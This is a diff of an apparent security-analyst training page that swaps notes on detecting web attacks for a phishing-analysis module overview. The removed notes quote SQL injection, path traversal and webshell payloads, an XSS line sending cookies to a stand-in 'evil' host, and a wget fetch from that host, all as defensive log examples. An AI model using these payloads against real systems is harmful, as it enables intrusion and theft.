@@ -1,28 +1,22 @@
 <div class="p-4 rounded mb-4" style="background:rgba(17,24,39,0.9);border:1px solid #1f2937;">
-<h6 class="text-primary mb-3"><i class="bi bi-book me-2"></i>Elaborated Notes with Examples</h6>
+<h6 class="text-danger mb-3"><i class="bi bi-book me-2"></i>Module 5: Phishing Analysis</h6>
 
-<h6 class="text-primary mt-3">1. SQL Injection Detection</h6>
-<p>SQLi occurs when user input is concatenated into SQL queries. Common patterns: <code>' OR '1'='1</code> for auth bypass, <code>UNION SELECT</code> for data extraction, and blind SQLi using <code>AND 1=1 / AND 1=2</code> responses. Look for special characters, SQL keywords, and anomalous response sizes in WAF/IDS logs.</p>
+<h6 class="text-danger mt-3">Sub-Domains / Rooms</h6>
+<ul style="color:#c0d0e0;">
+  <li><b>Phishing Analysis</b> — Analyze email headers (SPF, DKIM, DMARC), inspect URLs safely, extract and analyze attachments.</li>
+  <li><b>Phishing Prevention</b> — Deploy email filtering rules, user awareness training, DMARC enforcement, and reporting mechanisms.</li>
+  <li><b>Real-Phish Investigations</b> — Investigate real-world phishing campaigns, trace attacker infrastructure, and identify compromised accounts.</li>
+</ul>
+
 <div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Example:</b> WAF log shows <code>GET /product?id=1'+UNION+SELECT+1,2,3,4,5,@@version,user(),7-- HTTP/1.1</code> with 200 response and 12KB body (vs normal 2KB). The WAF triggered rule 942100 (SQL Injection Attack Detected via libinjection). The attacker extracted <code>Microsoft SQL Server 2019 (RTM) - 15.0.2000.5</code> and <code>dbo@sql-svr-01</code>.
+<b>Example Analysis:</b> An analyst receives a reported phishing email claiming to be from "security@paypa1.com". Header analysis shows: SPF=fail (sending IP 185.130.5.201 not authorized), DKIM=fail (signature mismatch), DMARC=fail (p=reject). The URL hxxps://paypa1.com/login resolves to 45.33.32.156 hosted in Russia. The attachment "Invoice.docm" contains a malicious VBA macro that downloads a PowerShell payload. The analyst blocks the domain, IP, and file hash, and sends a company-wide warning.
 </div>
 
-<h6 class="text-primary mt-3">2. Cross-Site Scripting (XSS)</h6>
-<p>XSS injects scripts into web pages viewed by other users. Reflected XSS appears in URLs (<code>&lt;script&gt;alert('xss')&lt;/script&gt;</code>), stored XSS is persisted in the database. Detection: look for <code>&lt;script&gt;</code>, <code>onerror</code>, <code>javascript:</code>, <code>&lt;img src=x onerror=...&gt;</code> in logs and server responses.</p>
-<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Example (Stored XSS):</b> A comment on <code>/product/review</code> contains <code>&lt;script&gt;fetch('hxxp://evil/steal?c='+document.cookie)&lt;/script&gt;</code>. The web server log shows <code>POST /product/review</code> with the payload in the body. When any user visits the product page, the script executes and exfiltrates session cookies. The analyst finds 127 cookie theft alerts in the SIEM and identifies the attacker IP.
-</div>
-
-<h6 class="text-primary mt-3">3. Path Traversal</h6>
-<p>Path traversal exploits insufficient input sanitization to read files outside the web root. Common patterns: <code>../../../etc/passwd</code>, <code>..%2f..%2f</code>, <code>%2e%2e%2f</code>, <code>....//....//</code>. Detection in access logs and WAF with rule IDs for traversal attempts.</p>
-<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Example:</b> WAF log: <code>GET /download?file=..%252f..%252f..%252fetc%252fpasswd HTTP/1.1</code> with response code 200 containing <code>root:x:0:0:root:/root:/bin/bash</code>. The double URL encoding (<code>%252f</code>) bypasses basic input filters. The server response reveals the application runs as <code>www-data</code>. The analyst blocks the source IP and identifies the vulnerability in the file download function.
-</div>
-
-<h6 class="text-primary mt-3">4. File Upload / Webshells</h6>
-<p>Unrestricted file upload allows attackers to upload malicious files (PHP/JSP/ASP webshells, .htaccess, .config) that give remote code execution. Detection involves monitoring for unexpected file extensions, file size anomalies, and outbound traffic from the web server.</p>
-<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Example:</b> Access log shows <code>POST /upload.php</code> with file <code>cmd.php</code> from IP 10.0.0.5. Content: <code>&lt;?php system($_GET['cmd']); ?&gt;</code>. Five seconds later: <code>GET /uploads/cmd.php?cmd=id HTTP/1.1</code> returning <code>uid=33(www-data)</code>. Then <code>cmd=cat+/etc/passwd</code>, <code>cmd=wget+hxxp://evil/tools.sh</code>. The WAF triggered no rule because the file was uploaded as image/png (MIME type tampered).
-</div>
-
+<h6 class="text-danger mt-3">Key Skills Learned</h6>
+<ul style="color:#c0d0e0;">
+  <li>Email header analysis (SPF, DKIM, DMARC)</li>
+  <li>Safe URL and attachment analysis</li>
+  <li>Phishing kit identification</li>
+  <li>Incident response for phishing campaigns</li>
+</ul>
 </div>
